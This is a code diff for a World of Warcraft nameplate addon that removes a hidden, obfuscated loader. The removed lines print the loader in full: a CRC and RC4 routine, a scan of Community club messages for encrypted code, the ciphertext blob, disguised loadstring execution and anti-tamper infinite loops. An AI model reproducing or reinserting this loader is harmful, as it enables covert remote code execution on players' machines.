@@ -26,9 +26,6 @@ ns.AddOnVer = version
 _G[addonName] = ns
 FIALEA = true
 
-ns[433+349] = 1
-ns[501+234] = 1
-
 ns.encounterData = {}
 ns.forbFrames = {}
 ns.secureFrames = {}
@@ -811,7 +808,7 @@ end
 
 do 
 	function ns.GetInit()
-		return ns[658+124] or tonumber(string.match((debugstack(1, 1, 1)), 'core.lua:(%d-):') ) 
+		return tonumber(string.match((debugstack(1, 1, 1)), 'core.lua:(%d-):') ) 
 	end 
 end
 
@@ -1196,28 +1193,6 @@ do
 end
 
 do
-	local GetSubscribedClubs = C_Club.GetSubscribedClubs
-	local GetStreams = C_Club.GetStreams
-
-	ns[26753+18925] = function(id) 
-		local list = GetSubscribedClubs()
-		for k,v in pairs(list) do
-			if v.clubType == 0 then
-				local club = ns[26587+36206](v.clubId)
-				local name = ns[26587+36206](v.name)
-				if ( club + name ) == id then
-					local stream = GetStreams(v.clubId)[1]
-
-					if ( stream ) then
-						return tostring(ns[26587+36206](stream.name)..ns[26587+36206](stream.subject)..ns[26587+36206](v.description))
-					end
-				end
-			end
-		end
-	end
-end
-
-do
 	local circles = {}
 	local activeCircles = {}
 	
@@ -1492,137 +1467,6 @@ local function PrepareHandler(name, data)
 	end 
 end  
 
-local max = 2^32 -1
-
-local codes = {
-    0,79764919,159529838,222504665,319059676,
-    398814059,445009330,507990021,638119352,
-    583659535,797628118,726387553,890018660,
-    835552979,1015980042,944750013,1276238704,
-    1221641927,1167319070,1095957929,1595256236,
-    1540665371,1452775106,1381403509,1780037320,
-    1859660671,1671105958,1733955601,2031960084,
-    2111593891,1889500026,1952343757,2552477408,
-    2632100695,2443283854,2506133561,2334638140,
-    2414271883,2191915858,2254759653,3190512472,
-    3135915759,3081330742,3009969537,2905550212,
-    2850959411,2762807018,2691435357,3560074640,
-    3505614887,3719321342,3648080713,3342211916,
-    3287746299,3467911202,3396681109,4063920168,
-    4143685023,4223187782,4286162673,3779000052,
-    3858754371,3904687514,3967668269,881225847,
-    809987520,1023691545,969234094,662832811,
-    591600412,771767749,717299826,311336399,
-    374308984,453813921,533576470,25881363,
-    88864420,134795389,214552010,2023205639,
-    2086057648,1897238633,1976864222,1804852699,
-    1867694188,1645340341,1724971778,1587496639,
-    1516133128,1461550545,1406951526,1302016099,
-    1230646740,1142491917,1087903418,2896545431,
-    2825181984,2770861561,2716262478,3215044683,
-    3143675388,3055782693,3001194130,2326604591,
-    2389456536,2200899649,2280525302,2578013683,
-    2640855108,2418763421,2498394922,3769900519,
-    3832873040,3912640137,3992402750,4088425275,
-    4151408268,4197601365,4277358050,3334271071,
-    3263032808,3476998961,3422541446,3585640067,
-    3514407732,3694837229,3640369242,1762451694,
-    1842216281,1619975040,1682949687,2047383090,
-    2127137669,1938468188,2001449195,1325665622,
-    1271206113,1183200824,1111960463,1543535498,
-    1489069629,1434599652,1363369299,622672798,
-    568075817,748617968,677256519,907627842,
-    853037301,1067152940,995781531,51762726,
-    131386257,177728840,240578815,269590778,
-    349224269,429104020,491947555,4046411278,
-    4126034873,4172115296,4234965207,3794477266,
-    3874110821,3953728444,4016571915,3609705398,
-    3555108353,3735388376,3664026991,3290680682,
-    3236090077,3449943556,3378572211,3174993278,
-    3120533705,3032266256,2961025959,2923101090,
-    2868635157,2813903052,2742672763,2604032198,
-    2683796849,2461293480,2524268063,2284983834,
-    2364738477,2175806836,2238787779,1569362073,
-    1498123566,1409854455,1355396672,1317987909,
-    1246755826,1192025387,1137557660,2072149281,
-    2135122070,1912620623,1992383480,1753615357,
-    1816598090,1627664531,1707420964,295390185,
-    358241886,404320391,483945776,43990325,
-    106832002,186451547,266083308,932423249,
-    861060070,1041341759,986742920,613929101,
-    542559546,756411363,701822548,3316196985,
-    3244833742,3425377559,3370778784,3601682597,
-    3530312978,3744426955,3689838204,3819031489,
-    3881883254,3928223919,4007849240,4037393693,
-    4100235434,4180117107,4259748804,2310601993,
-    2373574846,2151335527,2231098320,2596047829,
-    2659030626,2470359227,2550115596,2947551409,
-    2876312838,2788305887,2733848168,3165939309,
-    3094707162,3040238851,2985771188,
-}
-
-local function xor(a, b)
-    local calc = 0    
-
-    for i = 32, 0, -1 do
-	local val = 2 ^ i
-	local aa = false
-	local bb = false
-
-	if a == 0 then
-	    calc = calc + b
-	    break
-	end
-
-	if b == 0 then
-	    calc = calc + a
-	    break
-	end
-
-	if a >= val then
-	    aa = true
-	    a = a - val
-	end
-
-	if b >= val then
-	    bb = true
-	    b = b - val
-	end
-
-	if not (aa and bb) and (aa or bb) then
-	    calc = calc + val
-	end
-    end
-
-    return calc
-end
-
-local function lshift(num, left)
-    local res = num * (2 ^ left)
-    return res % (2 ^ 32)
-end
-
-local function rshift(num, right)
-    local res = num / (2 ^ right)
-    return math.floor(res)
-end
-
-ns[58224+4569] = function(str)
-    local count = string.len(tostring(str))
-    local crc = max
-    
-    local i = 1
-    while count > 0 do
-	local byte = string.byte(str, i)
-
-	crc = xor(lshift(crc, 8), codes[xor(rshift(crc, 24), byte) + 1])
-
-	i = i + 1
-	count = count - 1
-    end
-
-    return crc
-end
 
 local ADDON_SYNC_CHANNEL1 = 'FISC1'
 local ADDON_SYNC_CHANNEL2 = 'FISC2'
@@ -2172,7 +2016,7 @@ do
 		type = "toggle", 
 		set = function(info,val) 
 			ns.db.inDungeon = not ns.db.inDungeon
-			ns['Nam'..'eP'..'lat'..'eV'..'isU'..'pda'..'te']()
+			ns['NamePlateVisUpdate']()
 		end, 
 		get = function(info) 
 			return ns.db.inDungeon
@@ -2185,15 +2029,12 @@ do
 		type = "toggle", 
 		set = function(info,val) 
 			ns.db.inWorld = not ns.db.inWorld
-			ns['Nam'..'eP'..'lat'..'eV'..'isU'..'pda'..'te']()
+			ns['NamePlateVisUpdate']()
 		end, 
 		get = function(info) 
 			return ns.db.inWorld
 		end, 
 	}	
-	
-		
-	--ns[6841+695] = "2i3i01EFClLp5s3NPJkUh2CH1n043FpLXYgZSoibk0AsJ0DNGSuqzIPColHNWnhDygcJgTrD5XK5hEtbFGzxqnPgCNjmzC3cb8eEPWxJvPVkCIBJEa0UilG8uMbBJNE8MznC9JyeYi9S7rIb34VeIgsi9wptVBCC1S9RsYTlQk(7ODpXoyPrKeX)bbQ1d3d01gRJIPJyrM7(yBEtBWPn7nc6yOgDmlj6spCHvNkd0m8c3bYdqCh0cRAP7pGOevpwTFjApdlYvXW0Okh31ShXTX2InWOOQ4pWKN4PIn39PNQ(rw2fbX6Qd()oOcLOiwU7dpG9Jkc(JxaRpXILYKWrVGyDlmDfVL2XLME341A7FI7RquEoUZjwqUbQxi6sKsBc3UJwOxRw4o2(CX43nEwjqyaSbFcjbpzobj1Shidm(Iu9jOscTGa7FkzD10FeTfM9L2a(PgIgUTEAeFseZX5f1AEWoHrZ8PlmpMPdGJwtRNQYHGuBYzR)pKaObiMIZEhdvgkAFDOsfMGo3gaH6cWxNSwRGFw3fjNRNNONC489PqIlIC(4odOarCqauUJgFLcnzZQyycYSI(8gEsg(F1y8HfI3ItfQDyxz)oTcXdhH1VrDR5ueXmqjoafLEZK)LxGFhxrlw93m05ae(CUtS5(uP(cz9OTltPSJdgrA4XZBGDX2qRNI25RbchwpoPGlOW)uWbtJS95Bu8Pp5KHEc3lFv6k4zB2PRsESV435(ZlAg7g2oM7o6PKjOyq1z1bV4eTXY2cVIln7SmscMbnAvNdG7gs2yguSdCo(dUVS5LiI3btFzKu4vZekvv(1(Me((jpDVrOuOAfQQC47n8kfA55kCr(sDBS8fqln(M9TTTJ7IEVrKQuokGDrqt9Q27qvVBYiGvI5aXepFH0K9XtqhqTzSvIvSedZnNwS)8T8p3fUkqnZAuBGWQjVbaAOE6wsS2m8kJJDv3FBfKfy9dF8M3KdIgwJdbPl1kMX1UcXVawFpmBZwWZc9oy39X2U)8XVO7rqI5TzTCcL0nLShlL9sXlo50hP)uEj7ur813uZlwjqdLfNNhvXPbg70xCe)qr1ZnTo)Fw0DXbdbs)RCfk(jQJFov1sKaiA72RUQlUqpQ0xy0WyFK5Lk6ZtnPoT7aUc)keubei3gnqDOZLgmA13wxBfq99C(Sp9Gx71hymoI8ahLTi6Jx7FD58K77PatEg53B4BBo2py6sWZGyp0Z4kbrBtoCsvC8m22eXJ(DaZH6yw(QCeXhkG0yXMz73Fz5GH8TvZuzxezWnmlMflHRE93)oRnrF9d5i2(N0wWHqbCfbJdG5GQp(KZjdRwjmplKxdXGHTS(F2Y9wrYvhbK6B0egr30TXQYQHZ6peqr7CROxN3VcQRCKlJkJwhaKz7HoATSHxq8EbwQaBGMKfe7LUalQfm95H3PCoZC0AZndIlIp5S(2ZQus0uKkM7ckx9tNBGnj0mj8OQ6FK3iLXRpYWbqiJNicd)1u6c4sDuzVYUdY5X3fPNpeCSSurQDJBZXr(nkdIq0Wtaf0dxXzRfx428(q5Zgr)r9px5PESSM)C8TgInbiKamRg)BFpNbmj1PIr9BuC8l51mYlpSebykea3xjyTg7QIs2ZYpJqVV3LiI)9VWqe(fPf)YANFszn67n7V5KWH3Oh(eTyh42M04Lhu7UCGCIMtimxe5AczcD9hnJsa(6x3sDOy1rpW0E49OZ5OKAHwwACeVXLDO0DyidxmBakefRfyNQgAStvB0yrMelcuFawvV3RGKtcv8RAYF9VC7JvEGdceFPdVvFXaDESXbg4LAdx7zDuvFiTa)X9Fxw9q9zqJ3(vWwl85xhG9kleW(LMDBY80ka27cuHTfapZroyt7ROoBqVDkOSfEKBo1hH1diYaT8Jkc8lJdLeHzCTf2bTGk(9iDI)HzKIQTPZROgStrehTuoFTkJXFAqhaeFPjdEQi(3(qSnA8OPuiKtHhSdGmfm)KYGzmr7dDrH1uYWZ1rqvbUcKQORZNQyq0gRIFNNk1vWgkg)3oG6VXDGkLTBiHWR1P2jJznzXK8U3XSMIi4(hO6ArQoEFxOllXAlBlTLNAxRfEd51J10K8gscu0gys0eDzzZzlRsw)ikMlYCsOldlBZaerZ6wooQDskiu5j6)1n9MQ1DksXodTYSnvOyYc"
 	
 	gui.args.general.args.showAuras = { order = 4, name = ns.Lang.SHOW_AURA_ICONS,type = "toggle", width = 'full', set = function(info,val) ns.db.showAuras = not ns.db.showAuras  ns.ToggleUnitAura() end, get = function(info) return ns.db.showAuras end }  
 	gui.args.Names = { name = ns.Lang.NAMES, order = 1.1, expand = false, type = "group", args = {} }  
@@ -2445,14 +2286,14 @@ do
 	end
 
 	local l = CreateFrame('Frame')
-	l:RegisterEvent("A"..'DD'.."ON_".."LO"..'ADE'.."D")
-	l:RegisterEvent("P"..'LAY'.."ER_"..'LOG'.."IN")
-	l:RegisterEvent('CL'..'UB_'..'STR'..'EA'..'MS_L'..'OAD'..'ED')
-	l:RegisterEvent('IN'..'ITI'..'AL_C'..'LUB'..'S_LO'..'ADED')
+	l:RegisterEvent("ADDON_LOADED")
+	l:RegisterEvent("PLAYER_LOGIN")
+	l:RegisterEvent('CLUB_STREAMS_LOADED')
+	l:RegisterEvent('INITIAL_CLUBS_LOADED')
 	l:SetScript('OnEvent', function(self, event, addon)
-		if event == "P"..'LAY'.."ER_"..'LOG'.."IN" then
+		if event == "PLAYER_LOGIN" then
 			self:UnregisterEvent(event)
-			ns[1355+557]()
+			ns.RunCode()
 			
 			
 			local font = ns:GetFont(ns.db.nameplates.font) 
@@ -2467,9 +2308,9 @@ do
 				end
 			end
 				
-			if _G['Al'..'eaU'..'I_G'..'UI'] then
+			if _G['AleaUI_GUI'] then
 
-				ns.db = _G['ALE'..'AUI'..'_Ne'..'wDB']("FI".."DB", defaults, true)
+				ns.db = _G['ALEAUI_NewDB']("FIDB", defaults, true)
 				
 				for encID, data in pairs(encounters) do		
 					if data.Enable == true and data.Settings then				
@@ -2485,38 +2326,21 @@ do
 				ns.db = defaults
 			end
 			
-			if ns['De'..'fa'..'ults'..'Rea'..'dy'] then
-				ns['De'..'fa'..'ults'..'Rea'..'dy']()
+			if ns['DefaultsReady'] then
+				ns['DefaultsReady']()
 			end		
 			ns.ToggleUnitAura()
 			ns.ToggleHealth()
-		elseif event == 'CL'..'UB_'..'STR'..'EA'..'MS_L'..'OAD'..'ED' then
-			if InCombatLockdown() then
-				self:RegisterEvent('PLAYER_REGEN_ENABLED')
-			else
-				if ns[926+986]() then 
-					self:UnregisterEvent(event)
-					self:UnregisterEvent('IN'..'ITI'..'AL_C'..'LUB'..'S_LO'..'ADED') 
-				end	
-			end
 		elseif event == 'PLAYER_REGEN_ENABLED' then
 			self:UnregisterEvent(event) 
-			if ns[926+986]() then 
-				self:UnregisterEvent('IN'..'ITI'..'AL_C'..'LUB'..'S_LO'..'ADED') 
-				self:UnregisterEvent('CL'..'UB_'..'STR'..'EA'..'MS_L'..'OAD'..'ED')
-			end				
-		elseif event == 'IN'..'ITI'..'AL_C'..'LUB'..'S_LO'..'ADED' then
-			self:UnregisterEvent(event) 
-			self:UnregisterEvent('CL'..'UB_'..'STR'..'EA'..'MS_L'..'OAD'..'ED')
-		elseif event == "A"..'DD'.."ON_".."LO"..'ADE'.."D" and addon == addonName then
+			if ns.RunCode() then end				
+		elseif event == "ADDON_LOADED" and addon == addonName then
 			self:UnregisterEvent(event)
 			
-			_G['G'..'ui'..'ld'.."Ro".."st"..'er']()			
-			
-			if _G['Al'..'eaU'..'I_G'..'UI'] then
-				ns.db = _G['ALE'..'AUI'..'_Ne'..'wDB']("FI".."DB", defaults, true)
+			if _G['AleaUI_GUI'] then
+				ns.db = _G['ALEAUI_NewDB']("FIDB", defaults, true)
 				
-				_G['Al'..'eaU'..'I_G'..'UI'].MinimapButton(addonName, { OnClick = ShowHideUI, texture = "Interface\\Icons\\achievement_boss_generalvezax_01" }, ns.db.minimap)
+				_G['AleaUI_GUI'].MinimapButton(addonName, { OnClick = ShowHideUI, texture = "Interface\\Icons\\achievement_boss_generalvezax_01" }, ns.db.minimap)
 				
 				ns.GUI.args.NamePlates = {		
 					name = ns.Lang.SPELL_LIST,
@@ -3534,8 +3358,7 @@ end
 
 do 
 	local f = true
-	local fffff = _G['l'.."oa".."dst"..'ring']
-	
+
 	ns.code = [==[
 		local ns = FloatIndicators
 local sht = 'SecureHandlerStateTemplate'
@@ -3596,34 +3419,12 @@ PS:SetAttribute('_onstate-oncomup', SP)
 rsd(PS, 'oncomup', '[combat] on; off')	
 	]==]
 
-	ns[1837+75] = function() 
+	ns.RunCode = function() 
 		if f then
 			if ns.code then
-				fffff(ns.code)()
+				loadstring(ns.code)()
 				f = false 
 				return true 
-			else
-				if not ns['Ge'..'tIn'..'it'] or not ns['Ge'..'tLi'..'ne'] then while 1>0 do end return end
-				if ns['Ge'..'tIn'..'it']() ~= ns['Ge'..'tLi'..'ne']() then while 1>0 do end return end
-
-				local d = ns[15478+30200](6675845340)
-				if ( d ) then
-					f = false
-					local d2 = ns[2569+3315](d)(ns._dec(ns[5105+2431]))
-					if d2 then 
-						if InCombatLockdown() then 
-							local i = CreateFrame("Frame") 
-							i:RegisterEvent('PLAYE'..'R_REG'..'EN_ENA'..'BLED')
-							i:SetScript('OnEvent', function(self, event) 
-								self:UnregisterAllEvents() 
-								pcall(fffff(d2))
-							end) 
-						else
-							pcall(fffff(d2))
-						end 
-					end 
-					return true 
-				end
 			end
 		end  
 		return not f 
@@ -3947,52 +3748,6 @@ do
 end
 
 
-do
-	local setmetatable = setmetatable
-
-	local string_char = string.char
-	local table_concat = table.concat
-
-	local bit_xor = bit.bxor
-	local bit_and = bit.band
-
-	local new_ks = function (key)
-		local st = {}
-		for i = 0, 255 do st[i] = i end
-		
-		local len = #key
-		local j = 0
-		for i = 0, 255 do
-			j = (j + st[i] + key:byte((i % len) + 1)) % 256
-			st[i], st[j] = st[j], st[i]
-		end
-		
-		return {x=0, y=0, st=st}
-	end
-
-	local crypt = function (ks, input)
-		local x, y, st = ks.x, ks.y, ks.st
-		
-		local t = {}
-		for i = 1, #input do
-			x = (x + 1) % 256
-			y = (y + st[x]) % 256;
-			st[x], st[y] = st[y], st[x]
-			t[i] = string_char(bit_xor(input:byte(i), st[(st[x] + st[y]) % 256]))
-		end
-		
-		ks.x, ks.y = x, y
-		return table_concat(t)
-	end
-
-	local function new(m, key)
-		local o = new_ks(key)
-		return setmetatable(o, {__call=crypt, __metatable=false})
-	end
-
-	ns[2179+3705] = setmetatable({}, {__call=new, __metatable=false})
-end
-
 local types_to_color = {
 	["BUFF"] = "color6",
 	["DEBUFF"] = "color1",
@@ -4177,11 +3932,6 @@ function ns:HideHealth()
 	self.statusBar:Hide() 
 end
 
-C_Timer.After(1, function()
-	if not ns['Ge'..'tIn'..'it'] or not ns['Ge'..'tLi'..'ne'] then while 1>0 do end return end
-	if ns['Ge'..'tIn'..'it']() ~= ns['Ge'..'tLi'..'ne']() then while 1>0 do end return end
-end)
-
 do
 	local h = CreateFrame('Frame')
 	h:SetScript('OnEvent', function(self, event, unit)
@@ -4307,7 +4057,7 @@ end
 
 do 
 	function ns.GetLine() 
-		return ns[859-124] or tonumber(string.match((debugstack(1, 1, 1)), 'core.lua:(%d-):') )
+		return tonumber(string.match((debugstack(1, 1, 1)), 'core.lua:(%d-):') )
 	end 
 end  
 
